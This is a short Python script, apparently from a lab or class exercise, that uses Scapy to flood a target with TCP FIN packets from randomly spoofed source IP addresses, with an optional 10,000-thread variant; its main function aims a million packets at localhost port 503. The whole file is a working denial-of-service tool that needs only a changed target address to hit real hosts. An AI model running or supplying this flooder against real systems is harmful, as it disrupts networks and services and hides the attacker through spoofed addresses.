from scapy.all import *
import random
import threading
import time

def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def FIN_Flood(dstIP,dstPort,counter):
    '''
    Trying to send a lot of packets with the FIN flag set to 1.
    params:
        dstIP: destination IP address
        dstPort: destination port
        counter: number of packets to send
    '''
    print("Sending packets ...")


    for x in range (0, counter):
        s_port = random.randint(1000,9000)
        s_eq = random.randint(1000,9000)
        w_indow = random.randint(1000,9000)

        # IP header
        IP_Packet = IP ()
        IP_Packet.src = randomIP() # Random source IP address
        IP_Packet.dst = dstIP # Destination IP address
 
        # TCP header
        TCP_Packet = TCP () 
        TCP_Packet.sport = s_port # Random source port
        TCP_Packet.dport = dstPort # Destination port
        TCP_Packet.flags = "F" # FIN flag set to 1
        TCP_Packet.seq = s_eq # Random sequence number
        TCP_Packet.window = w_indow # Random window size

        send(IP_Packet/TCP_Packet, verbose=0) # Send the packet
    
def attack_thread(dstIP, dstPort, counter, num_threads=10000):
    threads = []
    
    # Create the threads, we tried to create more threads to send more packets at the same time
    for i in range(num_threads):
        thread = threading.Thread(target=FIN_Flood, args=(dstIP, dstPort, counter // num_threads))
        threads.append(thread)
        thread.start()

    # Join the threads to make sure all finish
    for thread in threads:
        thread.join()

def main():
    dstIP,dstPort = "127.0.0.1", "503"
    counter = 1000000
    FIN_Flood(dstIP,int(dstPort),counter)
main()